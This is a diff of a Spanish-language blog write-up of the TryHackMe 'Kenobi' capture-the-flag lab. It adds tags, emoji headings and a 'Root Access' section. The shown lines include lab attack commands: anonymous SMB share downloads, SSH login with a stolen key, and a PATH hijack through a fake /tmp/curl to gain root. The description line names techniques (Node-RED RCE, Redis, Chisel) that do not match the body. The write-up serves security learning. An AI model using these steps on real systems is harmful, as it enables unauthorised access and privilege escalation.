@@ -3,12 +3,13 @@ title: "TryHackMe - Kenobi"
 description: "Entorno multi-contenedor: Node-RED RCE, Redis write, Chisel port-forward y privesc con rsync+cron."
 pubDate: 2025-08-26
 draft: false
+tags: ["Linux Privilege Escalation ", "Ssh", "Nmap"]
 ---
 
 
 **IP:** 10.10.171.50
 
-##   Enumeración SMB
+##  🌐 Enumeración SMB
 
 ```bash
 
@@ -20,7 +21,7 @@ Acceso anónimo:
 smbclient //10.10.171.50/anonymous
 smbget -R smb://10.10.171.50/anonymous
   ```
-##   Explotación de ProFTPd
+## 🧪 Explotación de ProFTPd
 
 Robo de clave SSH:
 
@@ -35,7 +36,7 @@ Acceso SSH:
 chmod 600 id_rsa
 ssh -i id_rsa kenobi@10.10.171.50
   ```
-##  Escalada de Privilegios
+## 🦈 Escalada de Privilegios
 
 Manipulación de PATH:
 
@@ -46,3 +47,9 @@ chmod +x /tmp/curl
 export PATH=/tmp:$PATH
 /usr/bin/menu
   ```
+  ## 👑 Root Access
+
+  ```bash 
+  whoami
+# root
+```
